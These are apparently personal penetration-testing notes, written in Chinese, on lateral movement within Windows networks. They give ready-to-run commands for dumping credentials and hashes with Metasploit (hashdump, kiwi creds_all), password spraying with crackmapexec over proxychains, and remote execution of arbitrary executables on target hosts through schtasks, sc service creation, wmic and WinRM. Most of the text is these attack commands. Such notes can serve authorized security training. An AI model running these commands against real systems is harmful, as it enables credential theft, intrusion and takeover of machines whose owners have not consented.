1. 侦察: 主机信息收集, 内网网络结构收集
2. 凭据/特权收集: 主机密码凭证
3. 对网络中其他计算机的访问权限

横向移动: 同网段攻击
纵向移动: 从当前网段跨网段攻击

使用msf，反弹shell到msf
获取账号密码及Hash
```msf
getuid
hashdump
getsystem
load kiwi
creds_all
```

```
crackmapexec smb 192.168.58.133 -u administrator -p '1qaz@WSX' --local-auth --users

crackmapexec smb 192.168.58.133 -u administrator -p '1qaz@WSX' --local-auth --shares

smbclient //192.168.58.133/C$ -U 'pc\administrator%1qaz@WSX'
```

内网主机存活探测
nbtscan

## 内网密码喷洒
1. 建立socket代理, 上传agent
2. 上线节点, 启动代理
3. proxychains
4. crackmapexec密码喷洒, 碰撞与当前主机使用相同密码的主机

## 内置命令
IPC$ 进程间通信命名管道, 可以建立安全的通道并以此通道加密数据的交换, 实现对远程计算机的访问
net share ipc$  
net share ipc$ /del

### IPC+Schtasks
`schtasks`: 管理员增删改, 运行和中止本地或远程系统上的计划任务
```sh
# 创建任务  
schtasks /create /tn task1 /U 域\域用户 /P 域用户密码 /tr 命令 /sc ONSTART /s 域机器ip /RU  
system  
# 运行任务  
schtasks /run /tn task1 /s 192.168.10.2 /U 域/域用户 /P 域用户密码

# 删除任务  
schtasks /F /delete /tn task1 /s 域机器ip /U 域\域用户 /p 域用户密码
```

### IPC+SC
`SC`: 注册, 删除和查询系统服务
```sh
sc \\10.10.10.20 create test binpath= "c:\xx.exe" obj= "mingy\administrator" password=1qaz@WSX1

sc \\10.10.10.20 start test
```

### WMIC
Windows Management Instrumentstion, 用户管理办呢滴和远程计算机的一种模型, 可以访问, 配置和监视几乎所有Windows资源
https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmic

TCP135端口RPC, 系统管理员远程执行自动化管理任务
```sh
wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create "cmd.exe /c ipconfig"
```

### WinRM
Windows远程管理服务, 可以操作windows命令行, 在server2012后默认开启
端口:
- 5985(HTTP)
- 5986(HTTPS)

```sh
# 开启WinRM服务
winrm quickconfig
# 允许访问TrustedHosts列表中的远程主机
winrm set winrm/config/client @{TrustedHosts="*"}
# 执行命令
winrs -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e ipconfig

# 创建和启动服务
winrm invoke Create wmicimv2/Win32_Service @{Name="test";DisplayName="test";PathName="cmd.exe /k c:\59.exe"} -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e

winrm invoke StartService wmicimv2/Win32_Service?Name=test -r:http://10.10.10.201:5985 - u:administrator -p:1qaz@WSX3e
```

本机是否拥有很多凭证, 决定了横向移动的难度